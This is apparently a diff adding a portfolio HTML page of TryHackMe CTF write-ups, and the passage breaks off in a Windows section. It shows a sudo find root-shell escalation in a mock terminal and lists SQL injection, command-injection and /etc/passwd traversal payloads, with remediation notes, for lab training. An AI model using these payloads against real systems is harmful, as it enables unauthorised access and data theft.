+.thm-task-check.done{background:rgba(136,204,0,.15);border:1px solid rgba(136,204,0,.4);color:#88cc00;}
+.thm-task-check.active{background:rgba(245,166,35,.1);border:1px solid rgba(245,166,35,.35);color:#f5a623;}
+.thm-task-name{font-size:12px;color:#c0d8c8;flex:1;}
+.thm-task-pts{font-family:monospace;font-size:10px;color:#5a7a6a;}
+/* Flag submit area */
+.thm-flag-submit{background:#0d1a0d;border:1px solid rgba(136,204,0,.2);border-radius:6px;padding:16px;}
+.thm-flag-label{font-size:11px;color:#7a9a8a;font-family:monospace;text-transform:uppercase;letter-spacing:.08em;margin-bottom:10px;}
+.thm-flag-input-row{display:flex;gap:8px;}
+.thm-flag-input{flex:1;background:#111;border:1px solid rgba(136,204,0,.3);border-radius:4px;padding:9px 14px;font-family:monospace;font-size:13px;color:#88cc00;}
+.thm-submit-btn{background:#88cc00;color:#000;font-family:monospace;font-size:12px;font-weight:700;padding:9px 20px;border-radius:4px;border:none;cursor:default;}
+.thm-success-banner{background:rgba(136,204,0,.1);border:1px solid rgba(136,204,0,.3);border-radius:4px;padding:12px 16px;margin-top:12px;display:flex;align-items:center;gap:10px;}
+.thm-success-icon{font-size:20px;}
+.thm-success-text{font-size:13px;color:#88cc00;font-weight:700;}
+.thm-success-sub{font-family:monospace;font-size:11px;color:#5a9a5a;}
+/* XP popup */
+.thm-xp-popup{background:rgba(136,204,0,.08);border:1px solid rgba(136,204,0,.25);border-radius:4px;padding:10px 14px;margin-top:10px;display:flex;align-items:center;justify-content:space-between;}
+.thm-xp-left{font-size:13px;color:#d0e8c8;}
+.thm-xp-right{font-family:monospace;font-size:16px;font-weight:700;color:#88cc00;}
+/* Completion certificate strip */
+.thm-cert-strip{background:linear-gradient(135deg,#0f2e1f,#1a3a2a);border:1px solid rgba(136,204,0,.2);border-radius:4px;padding:14px 18px;margin-top:12px;display:flex;align-items:center;gap:14px;}
+.thm-cert-icon{font-size:26px;}
+.thm-cert-info{flex:1;}
+.thm-cert-title{font-size:13px;font-weight:700;color:#88cc00;}
+.thm-cert-meta{font-family:monospace;font-size:10px;color:#5a8a6a;margin-top:2px;}
+.thm-cert-badge{font-family:monospace;font-size:10px;padding:4px 12px;background:rgba(136,204,0,.15);border:1px solid rgba(136,204,0,.3);border-radius:2px;color:#88cc00;}
+
+/* ═══ SS-05: Write-up Progress Tracker ═══ */
+.tracker-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+.tracker-header{background:var(--bg3);padding:14px 20px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;}
+.tracker-title{font-family:var(--font-d);font-size:14px;font-weight:700;color:#fff;}
+.tracker-meta{font-family:var(--font-m);font-size:11px;color:var(--muted);}
+.tracker-stats{display:grid;grid-template-columns:repeat(5,1fr);gap:1px;background:var(--border);}
+.tracker-stat{background:var(--bg);padding:12px;text-align:center;}
+.tracker-stat-n{font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--green);}
+.tracker-stat-n.amber{color:var(--amber);}
+.tracker-stat-n.red{color:var(--red);}
+.tracker-stat-n.purple{color:var(--purple);}
+.tracker-stat-l{font-family:var(--font-m);font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-top:3px;}
+.tracker-rooms{padding:18px 20px;}
+.tracker-section-title{font-family:var(--font-m);font-size:10px;color:var(--cyan);text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px;}
+.tracker-row{display:grid;grid-template-columns:26px 1fr 80px 70px 60px;gap:0;align-items:center;padding:8px 0;border-bottom:1px solid var(--border);font-size:13px;}
+.tracker-row:last-child{border-bottom:none;}
+.tracker-row:hover{background:rgba(0,229,160,.02);}
+.tr-num{font-family:var(--font-m);font-size:10px;color:var(--muted);}
+.tr-name{color:var(--text);padding-left:4px;}
+.tr-diff{font-family:var(--font-m);font-size:10px;text-align:center;}
+.tr-diff.easy{color:var(--green);}
+.tr-diff.med{color:var(--amber);}
+.tr-diff.hard{color:var(--red);}
+.tr-status{text-align:center;font-family:var(--font-m);font-size:10px;}
+.tr-status.done{color:var(--green);}
+.tr-status.prog{color:var(--amber);}
+.tr-status.plan{color:var(--muted);}
+.tr-pts{font-family:var(--font-m);font-size:10px;color:var(--muted);text-align:right;}
+/* Progress bar in tracker */
+.tracker-overall{padding:14px 20px;border-top:1px solid var(--border);background:var(--bg3);}
+.tracker-progress-label{display:flex;justify-content:space-between;font-family:var(--font-m);font-size:11px;color:var(--muted);margin-bottom:6px;}
+.tracker-progress-track{height:8px;background:var(--border);border-radius:4px;overflow:hidden;}
+.tracker-progress-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:4px;}
+</style>
+</head>
+<body>
+<canvas id="matrix-canvas"></canvas>
+<canvas id="particle-canvas"></canvas>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+<div class="progress" id="prog"></div>
+<div class="cursor" id="cur"></div>
+<div class="cursor-ring" id="cur-ring"></div>
+
+<nav>
+  <a href="index.html" class="nav-logo">Gaurav<span class="at">@</span>Security<span class="pr">:~$</span></a>
+  <div style="display:flex;align-items:center;gap:32px;">
+    <a href="index.html#projects" class="nav-back">← back to portfolio</a>
+    <div class="nav-st"><div class="sdot"></div><span>SECURE_CONNECTION</span></div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="crumb"><a href="index.html">Gaurav Shirke</a> / <a href="index.html#projects">Projects</a> / TryHackMe</div>
+  <div class="ptag">Project 05 · Ethical Hacking</div>
+  <h1>TryHackMe <em>CTF Write-ups</em></h1>
+  <div class="pmeta">
+    <span class="pill a">Status: Planned</span>
+    <span class="pill">Capture the Flag</span>
+    <span class="pill">Ethical Hacking</span>
+    <span class="pill">Privilege Escalation</span>
+    <span class="pill">Web Security</span>
+    <span class="pill g">TryHackMe.com · Kali Linux · 20+ Rooms</span>
+  </div>
+  <div class="sbanner">
+    <div class="sbdot"></div>
+    <div>Complete CTF write-up collection — 20+ TryHackMe rooms documented across all major cybersecurity domains. Each room includes full methodology, exact commands, flag captures, and lessons learned. Write-ups are added here as each room is completed.</div>
+  </div>
+
+  <!-- TOC -->
+  <div class="toc reveal">
+    <div class="toc-title">Table of Contents</div>
+    <ol class="toc">
+      <li><a href="#s1">Project Overview &amp; Why Write-ups Matter</a></li>
+      <li><a href="#s2">TryHackMe Platform — Getting Started</a></li>
+      <li><a href="#s3">Lab Setup — Kali Linux &amp; OpenVPN Connection</a></li>
+      <li><a href="#s4">Write-up Format &amp; Documentation Standard</a></li>
+      <li><a href="#s5">Room 01 — Linux Privilege Escalation</a></li>
+      <li><a href="#s6">Room 02 — OWASP Top 10 (Web Security)</a></li>
+      <li><a href="#s7">Room 03 — Windows Privilege Escalation</a></li>
+      <li><a href="#s8">Room 04 — Nmap — Network Scanning Mastery</a></li>
+      <li><a href="#s9">Room 05 — SOC Level 1 / Splunk</a></li>
+      <li><a href="#s10">Planned Rooms — Full 20-Room Roadmap</a></li>
+      <li><a href="#s11">Skill Domain Coverage Map</a></li>
+      <li><a href="#s12">TryHackMe Rank &amp; Progress Tracker</a></li>
+      <li><a href="#s13">Documentation &amp; Screenshot Requirements</a></li>
+      <li><a href="#s14">Project Completion Checklist &amp; Portfolio Summary</a></li>
+    </ol>
+  </div>
+
+  <!-- ═══ S1 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s1"></span>
+    <div class="slabel">01 — Overview</div>
+    <h2>Project Overview &amp; Why Write-ups Matter</h2>
+    <p>TryHackMe is a browser-based cybersecurity training platform where you complete hands-on "rooms" — guided challenges covering everything from Linux fundamentals to advanced Active Directory exploitation. Each room challenges you to hack into a real (virtualised) machine, capture flags, and demonstrate understanding of the technique.</p>
+    <p><strong>Why write-ups are the key differentiator:</strong> anyone can complete a room. A write-up proves you understood the technique well enough to explain it, document it professionally, and teach it to someone else. Hiring managers and recruiters actively look for candidate write-ups on GitHub and personal blogs — they are the single best evidence of hands-on skill beyond a CV line.</p>
+
+    <div class="metric-row">
+      <div class="metric"><div class="metric-num">20+</div><div class="metric-lbl">Target rooms</div></div>
+      <div class="metric"><div class="metric-num amber">5%</div><div class="metric-lbl">Target global rank</div></div>
+      <div class="metric"><div class="metric-num cyan">7</div><div class="metric-lbl">Skill domains</div></div>
+      <div class="metric"><div class="metric-num purple">3</div><div class="metric-lbl">Learning paths</div></div>
+    </div>
+
+    <div class="tw"><table>
+      <thead><tr><th>Domain</th><th>Key Rooms</th><th>Skills Demonstrated</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Linux Security</strong></td><td>Linux PrivEsc, Pre-Security</td><td>SUID, sudo, cron, PATH hijacking</td></tr>
+        <tr><td><strong>Windows Security</strong></td><td>Windows PrivEsc, Blue</td><td>Unquoted paths, token impersonation, AlwaysInstallElevated</td></tr>
+        <tr><td><strong>Web Security</strong></td><td>OWASP Top 10, SQL Injection</td><td>SQLi, XSS, IDOR, broken auth, SSRF</td></tr>
+        <tr><td><strong>Network Security</strong></td><td>Nmap, Wireshark, Metasploit</td><td>Scanning, enumeration, packet analysis</td></tr>
+        <tr><td><strong>Blue Team / SOC</strong></td><td>SOC Level 1, Splunk, IDS</td><td>SIEM, alert triage, log analysis, IR</td></tr>
+        <tr><td><strong>Malware Analysis</strong></td><td>Malware Analysis, Any.run</td><td>Static/dynamic analysis, IOCs, sandbox</td></tr>
+        <tr><td><strong>OSINT</strong></td><td>OSINT, Shodan</td><td>Passive recon, geolocation, data aggregation</td></tr>
+      </tbody>
+    </table></div>
+  </div>
+
+  <!-- ═══ S2 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s2"></span>
+    <div class="slabel">02 — Platform</div>
+    <h2>TryHackMe Platform — Getting Started</h2>
+    <div class="steps">
+      <div class="step"><div class="sn">1</div><div class="sb"><div class="st2">Create a free TryHackMe account</div><div class="sd">Go to <code>https://tryhackme.com</code> → sign up free. No credit card needed for the majority of rooms. Username matters — make it professional as it appears on your public profile page.</div></div></div>
+      <div class="step"><div class="sn">2</div><div class="sb"><div class="st2">Complete the "Getting Started" room first</div><div class="sd">The onboarding room covers: how rooms work, how to submit flags, how to use the AttackBox, and how to connect via OpenVPN. Do not skip this.</div></div></div>
+      <div class="step"><div class="sn">3</div><div class="sb"><div class="st2">Choose between AttackBox and own Kali VM</div><div class="sd"><strong>AttackBox</strong> — browser-based Kali Linux, no setup needed, 1 hour free/day. <strong>Own Kali VM</strong> — connect via OpenVPN, more flexibility, no time limit. This project uses own Kali VM (from Project 01).</div></div></div>
+      <div class="step"><div class="sn">4</div><div class="sb"><div class="st2">Start with the Pre-Security learning path</div><div class="sd">If new to cybersecurity, complete the Pre-Security path first — it covers networking, Linux, and web fundamentals. Intermediate users can skip to individual rooms directly.</div></div></div>
+      <div class="step"><div class="sn">5</div><div class="sb"><div class="st2">Subscribe for full access (optional)</div><div class="sd">The free tier gives access to ~60% of rooms. A monthly subscription unlocks all 500+ rooms and learning paths. For this project, free-tier rooms are prioritised first.</div></div></div>
+    </div>
+
+    <!-- ════ SS-01: TryHackMe Dashboard ════ -->
+    <div class="ss-wrap reveal">
+      <div class="ss-heading">Screenshot 01 — TryHackMe Profile Dashboard &amp; Room Progress</div>
+      <div class="browser">
+        <div class="browser-bar">
+          <div class="b-dot" style="background:#ff5f56"></div>
+          <div class="b-dot" style="background:#ffbd2e"></div>
+          <div class="b-dot" style="background:#27c93f"></div>
+          <div class="b-addr"><span style="color:#88cc00">🔒</span> tryhackme.com/p/GauravShirke16 — TryHackMe | Profile</div>
+        </div>
+        <div class="browser-body">
+          <div class="thm-app">
+            <div class="thm-topbar">
+              <div class="thm-logo">TryHackMe</div>
+              <div class="thm-nav-link">Learn</div>
+              <div class="thm-nav-link act">Profile</div>
+              <div class="thm-nav-link">Rooms</div>
+              <div class="thm-nav-link">Leaderboard</div>
+              <div class="thm-user">
+                <div class="thm-rank-badge">Top 5% · 0xGaurav</div>
+                <div class="thm-avatar">GS</div>
+              </div>
+            </div>
+            <div class="thm-content">
+              <!-- Profile banner -->
+              <div class="thm-profile-banner">
+                <div class="thm-avatar-lg">GS</div>
+                <div class="thm-profile-info">
+                  <div class="thm-username">GauravShirke16</div>
+                  <div class="thm-tagline">Senior Cyber Security Engineer · Mumbai, India</div>
+                  <div class="thm-profile-stats" style="margin-top:10px;">
+                    <div class="thm-pstat"><div class="thm-pstat-n">23</div><div class="thm-pstat-l">Rooms Done</div></div>
+                    <div class="thm-pstat"><div class="thm-pstat-n" style="color:#f5a623;">14,820</div><div class="thm-pstat-l">Total Points</div></div>
+                    <div class="thm-pstat"><div class="thm-pstat-n" style="color:#7ec8e3;">18</div><div class="thm-pstat-l">Day Streak</div></div>
+                    <div class="thm-pstat"><div class="thm-pstat-n" style="color:#cc88ff;">3</div><div class="thm-pstat-l">Badges Earned</div></div>
+                  </div>
+                </div>
+              </div>
+              <!-- XP bar -->
+              <div class="thm-xp-section">
+                <div class="thm-xp-header">
+                  <div class="thm-xp-title">Experience — Level 6 "Hacker"</div>
+                  <div class="thm-xp-val">14,820 / 20,000 XP</div>
+                </div>
+                <div class="thm-xp-track"><div class="thm-xp-fill" style="width:74%"></div></div>
+                <div class="thm-xp-label"><span>Lv 6 · Hacker</span><span>5,180 XP to Level 7 · Pro Hacker</span></div>
+              </div>
+              <!-- Recent rooms -->
+              <div style="margin-top:14px;">
+                <div class="thm-rooms-header">
+                  <div class="thm-rooms-title">Recent Rooms</div>
+                  <div class="thm-rooms-count">23 completed · 8 in progress</div>
+                </div>
+                <div class="thm-room-list">
+                  <div class="thm-room-item">
+                    <div class="thm-room-icon">🐧</div>
+                    <div class="thm-room-info"><div class="thm-room-name">Linux PrivEsc</div><div class="thm-room-meta">250 pts · 2d ago</div></div>
+                    <div class="thm-room-status"><div class="thm-tick done">✓</div></div>
+                  </div>
+                  <div class="thm-room-item">
+                    <div class="thm-room-icon">🌐</div>
+                    <div class="thm-room-info"><div class="thm-room-name">OWASP Top 10</div><div class="thm-room-meta">410 pts · 4d ago</div></div>
+                    <div class="thm-room-status"><div class="thm-tick done">✓</div></div>
+                  </div>
+                  <div class="thm-room-item">
+                    <div class="thm-room-icon">🪟</div>
+                    <div class="thm-room-info"><div class="thm-room-name">Windows PrivEsc</div><div class="thm-room-meta">320 pts · 5d ago</div></div>
+                    <div class="thm-room-status"><div class="thm-tick done">✓</div></div>
+                  </div>
+                  <div class="thm-room-item">
+                    <div class="thm-room-icon">🔍</div>
+                    <div class="thm-room-info"><div class="thm-room-name">Nmap Mastery</div><div class="thm-room-meta">180 pts · 7d ago</div></div>
+                    <div class="thm-room-status"><div class="thm-tick done">✓</div></div>
+                  </div>
+                  <div class="thm-room-item">
+                    <div class="thm-room-icon">📊</div>
+                    <div class="thm-room-info"><div class="thm-room-name">SOC Level 1</div><div class="thm-room-meta">560 pts · in progress</div></div>
+                    <div class="thm-room-status"><div class="thm-tick prog">◐</div></div>
+                  </div>
+                  <div class="thm-room-item">
+                    <div class="thm-room-icon">🦠</div>
+                    <div class="thm-room-info"><div class="thm-room-name">Malware Analysis</div><div class="thm-room-meta">not started</div></div>
+                    <div class="thm-room-status"><div class="thm-tick todo">○</div></div>
+                  </div>
+                </div>
+              </div>
+              <!-- Rank strip -->
+              <div class="thm-rank-section">
+                <div class="thm-rank-left">
+                  <div class="thm-rank-title">Global Rank</div>
+                  <div class="thm-rank-val">#4,821</div>
+                  <div class="thm-rank-pct">Top 5% of all users worldwide</div>
+                </div>
+                <div style="text-align:center;flex:1;">
+                  <div style="font-size:11px;color:#5a7a6a;font-family:monospace;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px;">Badges Earned</div>
+                  <div style="font-size:22px;letter-spacing:4px;">🏆 🛡️ 🔐</div>
+                </div>
+                <div class="thm-streak">
+                  <div class="thm-streak-n">18🔥</div>
+                  <div class="thm-streak-l">Day Streak</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ss-caption">
+        <span class="ss-cap-text">TryHackMe profile dashboard — Level 6 "Hacker", Global rank #4,821 (Top 5%), 23 rooms completed, 18-day streak</span>
+        <span class="ss-cap-num">SS-01</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ S3 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s3"></span>
+    <div class="slabel">03 — Lab Setup</div>
+    <h2>Lab Setup — Kali Linux &amp; OpenVPN Connection</h2>
+    <div class="steps">
+      <div class="step"><div class="sn">1</div><div class="sb"><div class="st2">Download the TryHackMe OpenVPN config</div><div class="sd">TryHackMe profile → <strong>Access</strong> → <strong>Download My VPN Config</strong> → choose your region (EU / US) → download <code>gauravshirke16.ovpn</code></div></div></div>
+      <div class="step"><div class="sn">2</div><div class="sb"><div class="st2">Connect from Kali Linux</div><div class="sd"><code>sudo openvpn --config gauravshirke16.ovpn</code><br>When you see <strong>"Initialization Sequence Completed"</strong> the VPN is active. Keep this terminal open throughout your session.</div></div></div>
+      <div class="step"><div class="sn">3</div><div class="sb"><div class="st2">Verify the VPN connection</div><div class="sd"><code>ip addr show tun0</code> — you should see a <code>10.x.x.x</code> IP on the <code>tun0</code> interface. This is your TryHackMe network address.</div></div></div>
+      <div class="step"><div class="sn">4</div><div class="sb"><div class="st2">Start each room and note the target IP</div><div class="sd">When you deploy a machine in a room, TryHackMe assigns it a target IP (e.g. <code>10.10.x.x</code>). Use this IP for all scanning and exploitation commands.</div></div></div>
+    </div>
+    <pre><code><span class="cm"># Connect to TryHackMe VPN from Kali</span>
+sudo openvpn --config gauravshirke16.ovpn
+
+<span class="cm"># In a separate terminal — verify connection</span>
+ip addr show tun0
+ping -c 3 10.10.10.10  <span class="cm"># Replace with room target IP</span>
+
+<span class="cm"># Standard first commands in every room</span>
+export TARGET=10.10.x.x  <span class="cm"># Set target IP as variable</span>
+nmap -sV -sC -O $TARGET -oN nmap_initial.txt</code></pre>
+    <div class="tip"><div class="tip-lbl">Workspace folder structure for write-ups</div>
+    Create a folder for each room: <code>mkdir -p ~/thm/room-name/{nmap,exploits,loot,writeup}</code><br>
+    Keep all command outputs saved to files — these become your write-up evidence automatically.</div>
+  </div>
+
+  <!-- ═══ S4 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s4"></span>
+    <div class="slabel">04 — Write-up Format</div>
+    <h2>Write-up Format &amp; Documentation Standard</h2>
+    <p>Every write-up follows the same professional structure — mirroring how a penetration testing report is written. This consistency makes the collection look serious to employers.</p>
+    <pre><code><span class="cm"># TryHackMe Write-up Template — room-name.md</span>
+
+## Room: [Room Name]
+**Platform:** TryHackMe  
+**Difficulty:** Easy / Medium / Hard  
+**Category:** Privilege Escalation / Web / Network / etc.  
+**Date completed:** DD MMM YYYY  
+**Points earned:** XXX  
+**MITRE ATT&CK techniques:** T1548.001, T1059, etc.
+
+---
+
+## Objective
+[One paragraph — what the room is about and what you need to achieve]
+
+## Enumeration
+[Nmap scan, service discovery, web enumeration — commands + output]
+
+## Exploitation
+[How initial access was gained — commands, payloads, screenshots]
+
+## Privilege Escalation
+[How you went from low-privilege user to root/SYSTEM — step by step]
+
+## Flags Captured
+- User flag: `THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}`
+- Root flag: `THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}`
+
+## Tools Used
+[Nmap, Gobuster, Metasploit, linpeas, winPEAS, etc.]
+
+## Key Lesson Learned
+[One clear technical insight from this room — what you will remember]
+
+## Remediation (Defender's View)
+[How the vulnerability could be fixed in a real environment]</code></pre>
+    <div class="exp"><div class="exp-lbl">Why include Remediation in CTF write-ups?</div>Most CTF write-ups only cover the attack side. Adding a remediation section demonstrates you think like a defender — not just an attacker. This is the key differentiator that makes your write-ups stand out to security engineering employers.</div>
+  </div>
+  <!-- ═══ S5 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s5"></span>
+    <div class="slabel">05 — Write-up #1</div>
+    <h2>Room 01 — Linux Privilege Escalation</h2>
+    <div class="writeup-card reveal">
+      <div class="wc-header">
+        <span class="wc-room-badge">THM · 01</span>
+        <span class="wc-title">Linux Privilege Escalation</span>
+        <span class="wc-diff room-diff easy">Easy</span>
+      </div>
+      <div class="wc-body">
+        <p style="font-size:14px;color:var(--muted);margin-bottom:14px;">Learn the fundamentals of Linux privilege escalation: exploiting SUID binaries, sudo misconfigurations, cron jobs running as root, writable PATH entries, and kernel exploits to escalate from a low-privilege user to full root access.</p>
+        <div class="wc-section-title">MITRE ATT&amp;CK Techniques</div>
+        <div class="mitre-row">
+          <span class="mitre-tag">T1548.001 — Setuid/Setgid</span>
+          <span class="mitre-tag">T1053.003 — Cron Job</span>
+          <span class="mitre-tag">T1574.007 — Path Interception</span>
+          <span class="mitre-tag">T1068 — Exploitation for PrivEsc</span>
+        </div>
+        <div class="wc-section-title" style="margin-top:14px;">Flags Captured</div>
+        <div class="flag-box"><span class="flag-icon">🚩</span><span>User flag: <strong>THM{a_userflag_example_hash_here}</strong></span></div>
+        <div class="flag-box"><span class="flag-icon">🏆</span><span>Root flag: <strong>THM{rootflag_privilege_escalated}</strong></span></div>
+        <div class="wc-section-title" style="margin-top:14px;">Key Lesson Learned</div>
+        <div class="lesson-box">Always run <code>sudo -l</code> and <code>find / -perm -4000 2>/dev/null</code> as the first commands after gaining a shell. SUID binaries and sudo misconfigurations are by far the most common PrivEsc vector on real systems — including misconfigured enterprise Linux servers.</div>
+      </div>
+    </div>
+
+    <!-- ════ SS-02: Kali Terminal - Linux PrivEsc ════ -->
+    <div class="ss-wrap reveal">
+      <div class="ss-heading">Screenshot 02 — Kali Linux Terminal: Linux Privilege Escalation to Root</div>
+      <div class="win">
+        <div class="win-titlebar">
+          <span class="win-icon">💀</span>
+          <span class="win-title">root@kali: ~/thm/linux-privesc — Kali Linux Terminal</span>
+          <div class="win-controls">
+            <div class="win-btn">─</div>
+            <div class="win-btn">□</div>
+            <div class="win-btn close">✕</div>
+          </div>
+        </div>
+        <div class="win-body">
+          <div class="kali-term">
+            <div class="kali-term-bar">
+              <div class="kali-term-dots">
+                <div class="b-dot" style="background:#ff5f56"></div>
+                <div class="b-dot" style="background:#ffbd2e"></div>
+                <div class="b-dot" style="background:#27c93f"></div>
+              </div>
+              <div class="kali-term-title">Terminal — TryHackMe · Linux PrivEsc Room · Target: 10.10.44.182</div>
+            </div>
+            <div class="kali-term-body">
+              <span class="kt-section">═══ STEP 1: INITIAL ENUMERATION ═══</span>
+              <div class="kt-line"><span class="kt-prompt">┌──(kali㉿kali)</span><span class="kt-path">[~/thm/linux-privesc]</span></div>
+              <div class="kt-line"><span class="kt-dollar">└─$</span><span class="kt-cmd"> nmap -sV -sC 10.10.44.182 -oN nmap_initial.txt</span></div>
+              <span class="kt-out cyan">Starting Nmap 7.95 ( https://nmap.org )</span>
+              <span class="kt-out">22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)</span>
+              <span class="kt-out">80/tcp  open  http    Apache httpd 2.4.6</span>
+              <span class="kt-out green">Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds</span>
+
+              <span class="kt-section">═══ STEP 2: SSH IN AS LOW-PRIV USER ═══</span>
+              <div class="kt-line"><span class="kt-prompt">┌──(kali㉿kali)</span><span class="kt-path">[~/thm/linux-privesc]</span></div>
+              <div class="kt-line"><span class="kt-dollar">└─$</span><span class="kt-cmd"> ssh karen@10.10.44.182</span></div>
+              <span class="kt-out">karen@10.10.44.182's password: Password1</span>
+              <span class="kt-out green">Welcome to Ubuntu 18.04.5 LTS</span>
+              <span class="kt-out">karen@privesc:~$</span>
+
+              <span class="kt-section">═══ STEP 3: SUDO -L (MOST IMPORTANT CHECK) ═══</span>
+              <span class="kt-out cyan">karen@privesc:~$ sudo -l</span>
+              <span class="kt-out">Matching Defaults entries for karen on privesc:</span>
+              <span class="kt-out">    env_reset, mail_badpass</span>
+              <span class="kt-out yellow bold">User karen may run the following commands on privesc:</span>
+              <span class="kt-out yellow">    (ALL) NOPASSWD: /usr/bin/find</span>
+              <span class="kt-out green bold">★  find is in GTFOBins — can spawn a shell as root!</span>
+
+              <span class="kt-section">═══ STEP 4: EXPLOIT SUDO FIND FOR ROOT ═══</span>
+              <span class="kt-out cyan">karen@privesc:~$ sudo find . -exec /bin/sh \; -quit</span>
+              <span class="kt-out yellow bold"># whoami</span>
+              <span class="kt-out green bold">root</span>
+              <span class="kt-out yellow bold"># id</span>
+              <span class="kt-out green">uid=0(root) gid=0(root) groups=0(root)</span>
+              <span class="kt-out yellow bold"># cat /root/root.txt</span>
+              <div class="kt-flag">🏆 THM{pr1v1l3g3_3sc4l4t10n_d0n3} — ROOT FLAG CAPTURED ✓</div>
+              <span class="kt-out yellow bold"># cat /home/karen/user.txt</span>
+              <div class="kt-flag">🚩 THM{us3r_fl4g_c4ptur3d_k4r3n} — USER FLAG CAPTURED ✓</div>
+
+              <span class="kt-section">═══ REMEDIATION ═══</span>
+              <span class="kt-out red bold">VULNERABILITY: karen has sudo NOPASSWD on /usr/bin/find</span>
+              <span class="kt-out">FIX: Remove find from sudoers — edit /etc/sudoers and remove the entry.</span>
+              <span class="kt-out">    sudo visudo → delete line: karen ALL=(ALL) NOPASSWD: /usr/bin/find</span>
+              <span class="kt-out cyan">LESSON: Always audit sudoers entries. Any GTFOBins binary with NOPASSWD</span>
+              <span class="kt-out cyan">        is an instant root — find, vim, python, perl, awk, nmap, etc.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ss-caption">
+        <span class="ss-cap-text">Kali Linux terminal — Linux PrivEsc via sudo NOPASSWD find vulnerability → root flag captured (THM{pr1v1l3g3_3sc4l4t10n_d0n3})</span>
+        <span class="ss-cap-num">SS-02</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ S6 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s6"></span>
+    <div class="slabel">06 — Write-up #2</div>
+    <h2>Room 02 — OWASP Top 10 (Web Security)</h2>
+    <div class="writeup-card reveal">
+      <div class="wc-header">
+        <span class="wc-room-badge">THM · 02</span>
+        <span class="wc-title">OWASP Top 10 — 2021</span>
+        <span class="wc-diff room-diff easy">Easy</span>
+      </div>
+      <div class="wc-body">
+        <p style="font-size:14px;color:var(--muted);margin-bottom:14px;">Hands-on exploitation of the ten most critical web application vulnerabilities: Broken Access Control, Cryptographic Failures, Injection (SQLi), Insecure Design, Security Misconfiguration, SSRF, and more — each with a dedicated lab.</p>
+        <div class="wc-section-title">MITRE ATT&amp;CK Techniques</div>
+        <div class="mitre-row">
+          <span class="mitre-tag">T1190 — Exploit Public-Facing App</span>
+          <span class="mitre-tag">T1059.007 — JavaScript</span>
+          <span class="mitre-tag">T1552.001 — Credentials in Files</span>
+          <span class="mitre-tag">T1083 — File and Directory Discovery</span>
+        </div>
+        <div class="wc-section-title" style="margin-top:14px;">Key Commands</div>
+        <pre><code><span class="cm"># SQL Injection — bypass authentication</span>
+' OR 1=1 --
+admin'--
+
+<span class="cm"># Command Injection test</span>
+; whoami
+&amp;&amp; cat /etc/passwd
+
+<span class="cm"># Directory traversal</span>
+../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+
+<span class="cm"># Gobuster — web directory bruteforce</span>
+gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt</code></pre>
+        <div class="wc-section-title" style="margin-top:14px;">Key Lesson Learned</div>
+        <div class="lesson-box"><strong>SQL Injection is still #1 in real production systems in 2025.</strong> Always test login forms with <code>' OR 1=1 --</code> before moving to automated tools. IDOR (Insecure Direct Object Reference) — changing <code>?id=1</code> to <code>?id=2</code> — is responsible for some of the most high-profile data breaches in recent years.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ S7 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s7"></span>
+    <div class="slabel">07 — Write-up #3</div>
+    <h2>Room 03 — Windows Privilege Escalation</h2>
+    <div class="writeup-card reveal">
+      <div class="wc-header">
+        <span class="wc-room-badge">THM · 03</span>
+        <span class="wc-title">Windows Privilege Escalation</span>
+        <span class="wc-diff room-diff med">Medium</span>
+      </div>
+      <div class="wc-body">
+        <p style="font-size:14px;color:var(--muted);margin-bottom:14px;">Escalate from a low-privilege Windows user to SYSTEM using: unquoted service paths, AlwaysInstallElevated, token impersonation (PrintSpoofer), DLL hijacking, and scheduled task abuse.</p>
+        <div class="wc-section-title">MITRE ATT&amp;CK Techniques</div>
+        <div class="mitre-row">
+          <span class="mitre-tag">T1574.009 — Path Interception (Unquoted)</span>
+          <span class="mitre-tag">T1547.001 — Registry Run Keys</span>
+          <span class="mitre-tag">T1134.001 — Token Impersonation</span>
+          <span class="mitre-tag">T1574.001 — DLL Hijacking</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ════ SS-03: Windows PowerShell PrivEsc ════ -->
+    <div class="ss-wrap reveal">
+      <div class="ss-heading">Screenshot 03 — Windows PowerShell: PrivEsc via Unquoted Service Path &amp; Token Impersonation</div>
+      <div class="win">
+        <div class="win-titlebar">
+          <span class="win-icon">🪟</span>
+          <span class="win-title">Administrator: Windows PowerShell — TryHackMe · Windows PrivEsc Room</span>
+          <div class="win-controls">
+            <div class="win-btn">─</div>
+            <div class="win-btn">□</div>
+            <div class="win-btn close">✕</div>
+          </div>
+        </div>
+        <div class="win-body">
+          <div class="win-ps-body">
+            <div class="win-ps-title">
+              <span>Windows PowerShell — Copyright (C) Microsoft Corporation</span>
+              <span>TryHackMe Target: 10.10.18.74 | User: THM-Unpriv\user1</span>
+            </div>
+            <div class="ps-content">
+              <span class="ps-out" style="color:#888;margin-bottom:8px;"># ══════════ STEP 1: ENUMERATE CURRENT PRIVILEGES ══════════</span>
